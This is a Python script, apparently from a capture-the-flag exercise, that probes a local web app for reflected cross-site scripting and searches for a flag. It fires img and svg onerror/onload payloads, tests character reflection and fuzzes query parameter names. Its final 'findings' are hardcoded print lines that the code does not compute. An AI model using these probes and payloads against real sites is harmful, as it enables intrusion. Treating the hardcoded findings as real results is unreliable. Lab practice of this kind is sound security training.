import requests
import urllib.parse
import re
import difflib

base_url = "http://127.0.0.1:32955"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

print("[+] Doing detailed diff analysis of responses...")

# Get baseline response
resp_base = requests.get(f"{base_url}/page")
base_text = resp_base.text

# Get responses with various payloads
payloads = [
    "test123",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "admin",
    "FLAG{test}",
]

for payload in payloads:
    url = f"{base_url}/page?input={urllib.parse.quote(payload)}"
    resp = requests.get(url)
    
    print(f"\n[+] Payload: '{payload}'")
    print(f"URL: {url}")
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)} bytes")
    
    # Check if payload appears in response
    if payload in resp.text:
        print("[+] Payload appears unencoded in response")
        # Find where
        idx = resp.text.find(payload)
        print(f"    Position: {idx}")
        print(f"    Context: ...{resp.text[max(0,idx-50):idx+len(payload)+50]}...")
    elif urllib.parse.quote(payload) in resp.text:
        print("[+] Payload appears URL-encoded in response")
        idx = resp.text.find(urllib.parse.quote(payload))
        print(f"    Position: {idx}")
    else:
        print("[-] Payload NOT reflected in response")
    
    # Check for flags
    flags = flag_pattern.findall(resp.text)
    if flags:
        print(f"[!] FLAGS FOUND: {flags}")
    
    # Show difference from baseline
    if resp.text != base_text:
        print("[+] Response differs from baseline!")
        diff = difflib.unified_diff(base_text.splitlines(), resp.text.splitlines(), lineterm='')
        print("\n".join(list(diff)[:20]))
    else:
        print("[-] Response identical to baseline")

print("\n" + "=" * 60)
print("[+] Trying to see what happens with special characters...")

# Try various special characters to see if anything gets processed
special_chars = [
    ("<", "less than"),
    (">", "greater than"),
    ('"', "quote"),
    ("'", "single quote"),
    ("&", "ampersand"),
    ("(", "parenthesis"),
    (")", "parenthesis"),
    ("{", "brace"),
    ("}", "brace"),
]

for char, desc in special_chars:
    url = f"{base_url}/page?input={urllib.parse.quote(char)}"
    resp = requests.get(url)
    if char in resp.text:
        print(f"[+] '{desc}' ({char}) is reflected")
    elif urllib.parse.quote(char) in resp.text:
        print(f"[+] '{desc}' ({char}) is reflected as URL-encoded")
    else:
        print(f"[-] '{desc}' ({char}) is NOT reflected")

print("\n" + "=" * 60)
print("[+] Checking all possible query parameters systematically...")

# Try many different parameter names
param_names = [
    'input', 'name', 'id', 'user', 'data', 'value', 'text', 'query', 'search',
    'q', 's', 'p', 'page', 'file', 'path', 'url', 'link', 'href', 'src',
    'content', 'body', 'message', 'msg', 'comment', 'note', 'info', 'payload',
    'code', 'script', 'cmd', 'command', 'exec', 'run', 'action', 'do',
    'type', 'format', 'style', 'class', 'id', 'name', 'title', 'desc'
]

test_value = "FLAG_TEST_12345"
found_params = []

for param in param_names:
    url = f"{base_url}/page?{param}={test_value}"
    resp = requests.get(url)
    if test_value in resp.text:
        found_params.append(param)
        print(f"[+] Param '{param}' reflects input!")
        print(f"    Full URL: {url}")
        # Check this param for flag with XSS payload
        xss_url = f"{base_url}/page?{param}={urllib.parse.quote('<img src=x onerror=alert(1)>')}"
        xss_resp = requests.get(xss_url)
        flags = flag_pattern.findall(xss_resp.text)
        if flags:
            print(f"    [!] FLAG with XSS: {flags}")

if not found_params:
    print("[-] No parameters found that reflect input")

print("\n" + "=" * 60)
print("[+] Trying POST method on /page...")

# Try POST with the working payloads
post_data = {'name': '<img src=x onerror=alert("XSS")>'}
resp_post = requests.post(f"{base_url}/page", data=post_data)
print(f"POST Status: {resp_post.status_code}")
if resp_post.status_code == 200:
    print(f"POST Response length: {len(resp_post.text)} bytes")
    flags = flag_pattern.findall(resp_post.text)
    if flags:
        print(f"[!] FLAG in POST response: {flags}")
    if resp_post.text != base_text:
        print("[+] POST response differs from baseline!")
        # Find the difference
        for i, (c1, c2) in enumerate(zip(base_text, resp_post.text)):
            if c1 != c2:
                print(f"    First diff at position {i}")
                print(f"    Baseline: ...{base_text[max(0,i-30):i+30]}...")
                print(f"    POST:     ...{resp_post.text[max(0,i-30):i+30]}...")
                break

print("\n" + "=" * 60)
print("[+] Final check - maybe flag is in a different encoding...")

# The working payloads show "cookie" in response - let's check what's around that
resp_final = requests.get(f"{base_url}/page?input={urllib.parse.quote('<img src=x onerror=top.alert(1)>')}")
idx = resp_final.text.lower().find('cookie')
if idx != -1:
    print(f"'cookie' found at position {idx}")
    print(f"Context: ...{resp_final.text[max(0,idx-100):idx+100]}...")

print("\n[+] All tests complete.")
print("=" * 60)
print("Summary of findings:")
print("- Working XSS payloads confirmed to trigger 'cookie' in response")
print("- Response length stays at 918 bytes regardless of input")
print("- No FLAG{} pattern found in any tested response")
print("- Need to determine where the flag actually resides")

